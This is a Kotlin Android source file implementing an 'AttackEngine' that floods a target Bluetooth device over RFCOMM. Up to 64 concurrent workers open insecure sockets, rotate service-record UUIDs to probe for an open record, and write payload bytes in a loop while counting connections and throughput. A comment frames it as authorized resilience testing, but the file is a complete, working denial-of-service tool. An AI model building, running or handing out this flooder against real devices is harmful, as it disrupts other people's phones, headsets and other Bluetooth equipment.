package api

import android.annotation.SuppressLint
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothSocket
import android.os.SystemClock
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.cancelAndJoin
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.SharedFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asSharedFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.runInterruptible
import kotlinx.coroutines.withTimeoutOrNull
import kotlinx.coroutines.yield
import java.io.IOException
import java.util.Collections
import java.util.UUID
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.atomic.AtomicLong
import kotlin.coroutines.coroutineContext

/**
 * Immutable snapshot of an attack run. Pure data (no Android types) so it can be
 * unit tested and safely handed to the UI layer.
 */
data class AttackStats(
    val running: Boolean = false,
    val activeWorkers: Int = 0,
    val connectAttempts: Long = 0L,
    val successfulConnections: Long = 0L,
    val failedConnections: Long = 0L,
    val bytesSent: Long = 0L,
    val elapsedMillis: Long = 0L,
) {
    /** Average payload throughput over the run so far, in bytes/second. */
    val bytesPerSecond: Long
        get() = if (elapsedMillis <= 0L) 0L else bytesSent * 1000L / elapsedMillis
}

/** One-off things worth telling the UI about, independent of the periodic stats stream. */
sealed interface AttackEvent {
    data class Started(val target: String, val workers: Int) : AttackEvent
    data class Log(val message: String) : AttackEvent
    data object Stopped : AttackEvent
}

/**
 * RFCOMM socket-flood engine used for controlled resilience testing of a device you own
 * or are authorized to test.
 *
 * Design notes vs. the previous implementation:
 *  - No Android UI coupling: progress is exposed as [stats] (a [StateFlow]) and [events]
 *    (a [SharedFlow]); the engine never touches views or a Context.
 *  - The engine owns its own lifecycle state instead of reading a static flag from an Activity.
 *  - [BluetoothSocket.connect] is wrapped in a timeout + [runInterruptible] so a worker can
 *    never hang forever on a half-open connection.
 *  - [stopAndJoin]/[cancel] close every open socket first, which unblocks any thread parked in
 *    a native connect()/write(), so stopping is prompt and deterministic.
 */
class AttackEngine(
    private val targetAddress: String,
    private val payloadSize: Int = DEFAULT_PAYLOAD_SIZE,
    private val connectTimeoutMs: Long = DEFAULT_CONNECT_TIMEOUT_MS,
    private val retryBackoffMs: Long = DEFAULT_RETRY_BACKOFF_MS,
) {

    companion object {
        const val DEFAULT_PAYLOAD_SIZE = 600
        const val DEFAULT_CONNECT_TIMEOUT_MS = 8_000L
        const val DEFAULT_RETRY_BACKOFF_MS = 100L
        const val MAX_WORKERS = 64
        private const val STATS_INTERVAL_MS = 250L

        // Base Serial Port Profile UUID; workers rotate the prefix when a connection fails.
        private val BASE_UUID: UUID = UUID.fromString("00001105-0000-1000-8000-00805F9B34FB")
    }

    private var scope: CoroutineScope? = null
    private var startedAt = 0L

    private val attempts = AtomicLong(0)
    private val successes = AtomicLong(0)
    private val failures = AtomicLong(0)
    private val bytes = AtomicLong(0)
    private val workersActive = AtomicInteger(0)

    // Every socket currently owned by a worker. Closing these unblocks native connect()/write().
    private val openSockets: MutableSet<BluetoothSocket> =
        Collections.synchronizedSet(mutableSetOf())

    private val _stats = MutableStateFlow(AttackStats())
    val stats: StateFlow<AttackStats> = _stats.asStateFlow()

    private val _events = MutableSharedFlow<AttackEvent>(replay = 0, extraBufferCapacity = 256)
    val events: SharedFlow<AttackEvent> = _events.asSharedFlow()

    val isRunning: Boolean get() = scope?.isActive == true

    @SuppressLint("MissingPermission")
    fun start(device: BluetoothDevice, workers: Int) {
        if (isRunning) return
        resetCounters()
        startedAt = SystemClock.elapsedRealtime()

        val newScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        scope = newScope

        val workerCount = workers.coerceIn(1, MAX_WORKERS)
        emit(AttackEvent.Started(targetAddress, workerCount))

        repeat(workerCount) { index -> newScope.launch { runWorker(device, index + 1) } }
        newScope.launch { statsTicker() }
    }

    /** Stops the attack and suspends until all workers have actually finished. */
    suspend fun stopAndJoin() {
        val current = scope ?: return
        scope = null
        closeAllSockets()
        // Bounded join so a pathological blocked write can never wedge the caller (the UI).
        withTimeoutOrNull(2_000L) { current.coroutineContext[Job]?.cancelAndJoin() }
        finishStop()
    }

    /** Fire-and-forget stop for lifecycle teardown (onPause/onDestroy). */
    fun cancel() {
        val current = scope ?: return
        scope = null
        closeAllSockets()
        current.cancel()
        finishStop()
    }

    private suspend fun statsTicker() {
        while (coroutineContext.isActive) {
            publishStats(running = true)
            delay(STATS_INTERVAL_MS)
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun runWorker(device: BluetoothDevice, id: Int) {
        workersActive.incrementAndGet()
        var uuid = BASE_UUID
        try {
            while (coroutineContext.isActive) {
                var socket: BluetoothSocket? = null
                try {
                    attempts.incrementAndGet()
                    socket = device.createInsecureRfcommSocketToServiceRecord(uuid)
                    openSockets.add(socket)

                    val target = socket
                    val connected = withTimeoutOrNull(connectTimeoutMs) {
                        // connect() is blocking; runInterruptible makes it cancellable via
                        // thread interruption when the coroutine is cancelled.
                        runInterruptible(Dispatchers.IO) { target.connect() }
                        true
                    } ?: false

                    if (connected && socket.isConnected) {
                        successes.incrementAndGet()
                        emit(AttackEvent.Log("[#$id] connected; sending payload"))
                        flood(socket)
                    } else {
                        failures.incrementAndGet()
                        uuid = nextProbeUuid()
                        emit(AttackEvent.Log("[#$id] connect timed out; retrying"))
                        delay(retryBackoffMs)
                    }
                } catch (e: CancellationException) {
                    throw e
                } catch (e: IOException) {
                    failures.incrementAndGet()
                    // Rotate the service-record UUID prefix to probe for an open record.
                    uuid = nextProbeUuid()
                    emit(AttackEvent.Log("[#$id] connect failed; retrying"))
                    delay(retryBackoffMs)
                } finally {
                    socket?.let { openSockets.remove(it) }
                    closeQuietly(socket)
                }
            }
        } finally {
            workersActive.decrementAndGet()
        }
    }

    private suspend fun flood(socket: BluetoothSocket) {
        val buffer = ByteArray(payloadSize.coerceAtLeast(1)) { ((it % 40) + 'A'.code).toByte() }
        val out = socket.outputStream
        try {
            while (coroutineContext.isActive && socket.isConnected) {
                out.write(buffer)
                bytes.addAndGet(buffer.size.toLong())
                // Cooperative suspension point so cancellation (Stop) takes effect promptly.
                yield()
            }
        } catch (e: IOException) {
            // Connection dropped; the worker loop will attempt to reconnect.
        }
    }

    private fun nextProbeUuid(): UUID =
        UUID.fromString(UUID.randomUUID().toString().substringBefore('-') + "-0000-1000-8000-00805F9B34FB")

    private fun resetCounters() {
        attempts.set(0)
        successes.set(0)
        failures.set(0)
        bytes.set(0)
        workersActive.set(0)
        _stats.value = AttackStats()
    }

    private fun finishStop() {
        workersActive.set(0)
        publishStats(running = false)
        emit(AttackEvent.Stopped)
    }

    private fun publishStats(running: Boolean) {
        _stats.value = AttackStats(
            running = running,
            activeWorkers = workersActive.get(),
            connectAttempts = attempts.get(),
            successfulConnections = successes.get(),
            failedConnections = failures.get(),
            bytesSent = bytes.get(),
            elapsedMillis = if (startedAt == 0L) 0L else SystemClock.elapsedRealtime() - startedAt,
        )
    }

    private fun closeAllSockets() {
        val snapshot = synchronized(openSockets) { openSockets.toList() }
        snapshot.forEach { closeQuietly(it) }
        openSockets.clear()
    }

    private fun emit(event: AttackEvent) {
        _events.tryEmit(event)
    }

    private fun closeQuietly(socket: BluetoothSocket?) {
        try {
            socket?.close()
        } catch (e: IOException) {
            // ignore
        }
    }
}
